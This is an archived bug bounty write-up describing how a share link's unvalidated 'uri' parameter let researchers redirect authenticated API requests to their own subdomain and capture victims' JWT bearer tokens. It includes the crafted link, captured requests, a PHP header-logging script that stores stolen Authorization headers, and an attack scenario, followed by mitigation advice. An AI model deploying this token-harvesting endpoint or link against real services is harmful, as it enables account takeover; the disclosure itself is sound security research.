---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-24_account-takeover-via-improper-input-validation.md
original_filename: 2021-10-24_account-takeover-via-improper-input-validation.md
title: Account Takeover via improper input validation
category: documents
detected_topics:
- oauth
- api-security
- jwt
- access-control
- ssrf
- command-injection
tags:
- imported
- documents
- oauth
- api-security
- jwt
- access-control
- ssrf
- command-injection
language: en
raw_sha256: 6ccc1ced53705be65a48db8dc7bf09f31a44d190cdccd02a02681fe34f8c4469
text_sha256: 57966c006b31fc047c539d392fbabdf76976704298a4f322b676b7e532248c7d
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Account Takeover via improper input validation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-24_account-takeover-via-improper-input-validation.md
- Source Type: markdown
- Detected Topics: oauth, api-security, jwt, access-control, ssrf, command-injection
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `6ccc1ced53705be65a48db8dc7bf09f31a44d190cdccd02a02681fe34f8c4469`
- Text SHA256: `57966c006b31fc047c539d392fbabdf76976704298a4f322b676b7e532248c7d`


## Content

---
title: "Account Takeover via improper input validation"
page_title: "Account Takeover via improper input validation | I'm Gaurav Narwani"
url: "https://gauravnarwani.com/account-takeover-via-improper-input-validation/"
final_url: "https://gauravnarwani.com/account-takeover-via-improper-input-validation/"
authors: ["Gaurav Narwani (@gauravnarwani97)", "Verneet (@err0rrrrr)"]
bugs: ["OAuth", "Token leak", "Account takeover"]
publication_date: "2021-10-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3218
---

[ ![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2021/10/input.jpg?fit=500%2C500&ssl=1) ](https://gauravnarwani.com/account-takeover-via-improper-input-validation/)

# Account Takeover via improper input validation

[admin](https://gauravnarwani.com/author/admin/ "Posts by admin") / [October 24, 2021](https://gauravnarwani.com/account-takeover-via-improper-input-validation/) / [0 Comments](https://gauravnarwani.com/account-takeover-via-improper-input-validation/#respond)

In the following post, input invalidation caused requests to be manipulated to completely take over any account. There are many different ways to takeover any account, but such a case is rarely observed. The attacker sent input is directly appended on the application-generated API request, which allowed him to modify the request to send to a domain of his control. The vulnerability is described in the below case study, after which there is a Bug Bounty Tip. These tips are generally picked from Twitter by the #bugbountytip in search. Any interesting tip found would undoubtedly be added to the blogs. Please don’t forget to read the Bug Bounty Tip at the end of each post and like, share and subscribe to the Blog.

## Case Study: Improper Input Validation -> Account Takeover

The application under test was a three-tier web application – Presentation tier (Front-End/User Interface), Application Tier (Functional Logic), and Data-Tier (Databases). As this was a private program, all illustrations of vulnerabilities will be represented with the host as example.com.

The application had a share functionality where a link was generated on clicking. The link had a parameter named uri which accepted endpoint to the resource and, in return, loaded them from api.example.com client-side.
  
  
  **Request 1:** https://example.com/share/endpoint?uri=/items/1
  **Response:**
  200 OK
  Website Data
  
  
  
  **Request 2 (Website generated Request):**
  GET /items/1 HTTP/1.1
  Host: api.example.com
  …
  Authorization Bearer eyj0…
  …
  **Response:**
  200 OK
  …
  Data of item 1
  …
  

On observing the series of requests, it was seen that the resource loaded was entirely client-side and thus eliminated the option of SSRF. The parameter uri was then fuzzed in an attempt to show the malicious impact.

**First Analysis** : Whenever the link was visited, an OPTIONS request was sent to the API endpoint. If the endpoint existed or the response returns appropriate headers, the request would be successful, and a GET request will be sent to obtain the item requested. 
  
  
  **Request 1:** https://example.com/share/endpoint?uri=/items/1
  **Response:**
  200 OK
  Website Data
  
  
  
  **Request 2 (Website generated Request):**
  OPTIONS /items/1 HTTP/1.1
  Host: api.example.com
  …
  **Response:**
  HTTP/1.1 204 No Content
  Connection: close
  Server: nginx
  Cache-Control: private, no-store, no-cache
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Methods: GET, OPTIONS
  Access-Control-Allow-Headers: Authorization, Content-Type, Location, User-Agent
  …
  
  

Request 3 will then be sent to GET /items/1 from api.example.com

**Second Analysis** : The parameter uri would allow anything to be appended to the path, and hence various different characters were entered to see how the application responds to fuzzing 
  
  
  **Request 1:** https://example.com/share/endpoint?uri=/12/asad
  **Response:**
  200 OK
  Website Data
  
  
  
  **Request 2 (Website generated Request):**
  GET /12/asad HTTP/1.1
  Host: api.example.com
  …
  Authorization Bearer eyj0…
  …
  **Response:**
  HTTP/1.1 200 OK
  …
  Data of item 1
  …
  
  

**Third analysis** : On entering the value ‘.gauravnarwani.com’ in the parameter uri (notice the dot before gauravnarwani.com), it was observed that the request did take the absolute path and sent the OPTIONS request to https://api.example.com.gauravnarwani.com/.
  
  
  **Request 1:** https://example.com/share/endpoint?uri=.gauravnarwani.com
  **Response:**
  200 OK
  Website Data
  
  
  
  **Request 2 (Website generated Request):**
  OPTIONS / HTTP/1.1
  Host: api.example.com.gauravnarwani.com
  …
  **Response:**
  HTTP/1.1 200 OK
  Server generated headers
  …
  
  

### Bringing it all together

To exploit this vulnerability, a subdomain api.example.com.gauravnarwani.com was generated. As in the first analysis, we saw that the OPTIONS request sent to the application gave multiple headers in the response, and thus it was needed to be added to the newly made subdomain. Once the subdomain returns the appropriate response headers, a GET request will be made to this path.

The PHP file was generated to set the appropriate headers and code to store data to the log file.
  
  
  <?php
  header("Server: nginx"); 
  header("Content-Type: text/html; charset=UTF-8"); 
  header("Cache-Control: private, no-store, no-cache"); 
  header("Access-Control-Allow-Origin: *"); 
  header("Access-Control-Allow-Methods: GET, DELETE, PATCH, OPTIONS"); 
  header("Access-Control-Allow-Headers: Authorization, Content-Type, Location, User-Agent”); 
  header("Allow: GET,DELETE,PATCH,OPTIONS"); 
  //…other headers… 
  $iplogfile = 'logs.html'; 
  $ipaddress = $_SERVER['REMOTE_ADDR']; 
  $webpage = $_SERVER['SCRIPT_NAME']; 
  $timestamp = date('d/m/Y h:i:s'); 
  $browser = $_SERVER['HTTP_USER_AGENT']; 
  $fp = fopen($iplogfile, 'a+'); 
  chmod($iplogfile, 0777); 
  foreach (getallheaders() as $name => $value) 
  {
  echo "$name: $value";
  fwrite($fp, '['.$value.']: '.$ipaddress.' '.$webpage.' '. $value. "\n");
  }
  fclose($fp);
  ?>
  

Now on visiting the URL https://example.com/share/endpoint?uri=.gauravnarwani.com, a GET request was made to api.example.com.gauravnarwani.com with JWT token in the body. The JWT token is then stored in the file logs.html, which the attacker can then access.
  
  
  **Request:** 
  GET / HTTP/1.1
  Host: api.example.com.gauravnarwani.com
  …
  Authorization Bearer: eyj0…
  …
  

In possession of the JWT token, the attacker has complete access to the victims’ account and can perform anything on his behalf.

#### Attack Scenario:

  1. The attacker crafts the malicious links and hosts the subdomain required to perform the attack
  2. The attacker now sends the malicious link to the victim. For example: https://example.com/share/endpoint?uri=.gauravnarwani.com
  3. The victim visits the link intentionally or unintentionally, and a request is sent from api.example.com with the victim’s token.
  4. The token is stored at https://api.example.com.gauravnarwani.com/logs.html, which can be used to send a request to api.example.com and takeover victims account.

#### Takeaways-

  1. Never accept any input blindly – The processed request can be intercepted and manipulated to chain vulnerabilities.
  2. Whitelist all input – Any input or special characters added in the parameters or URL should be checked with the whitelisted inputs. If absent, drop the request.
  3. Fuzz all characters – Fuzzing special characters can produce many unexpected results, so always try this.
  4. Never give up. The program was a 5-year-old program, and still, a critical bug was found on the website.

That’s all for this Blog. Hope you liked it.

#BugBountyTip: Always check redirect_uri on Oauth login pages. If they belong to third party, they are most likely misconfigured for open redirect and hence account takeover. Try finding open redirects on subdomains in case filter added for *.domain.com

The vulnerability was found in joint efforts with [Verneet Singh](https://twitter.com/err0rrrrr).

That’s all for today. Please subscribe to my [Blog](https://gauravnarwani.com). Connect with me on [LinkedIn](https://www.linkedin.com/in/gauravnarwani97).

### Share this:

  * [Twitter](https://gauravnarwani.com/account-takeover-via-improper-input-validation/?share=twitter "Click to share on Twitter")
  * [Facebook](https://gauravnarwani.com/account-takeover-via-improper-input-validation/?share=facebook "Click to share on Facebook")
  * [LinkedIn](https://gauravnarwani.com/account-takeover-via-improper-input-validation/?share=linkedin "Click to share on LinkedIn")
  * [WhatsApp](https://gauravnarwani.com/account-takeover-via-improper-input-validation/?share=jetpack-whatsapp "Click to share on WhatsApp")
  * [Telegram](https://gauravnarwani.com/account-takeover-via-improper-input-validation/?share=telegram "Click to share on Telegram")
  * [Print](https://gauravnarwani.com/account-takeover-via-improper-input-validation/#print "Click to print")
  * 

### Like this:

Like Loading...

Posted in: [Bug Bounty](https://gauravnarwani.com/category/bugb/)

Tags:[account takeover](https://gauravnarwani.com/tag/account-takeover/) [bug bounty](https://gauravnarwani.com/tag/bug-bounty/) [input validation](https://gauravnarwani.com/tag/input-validation/)
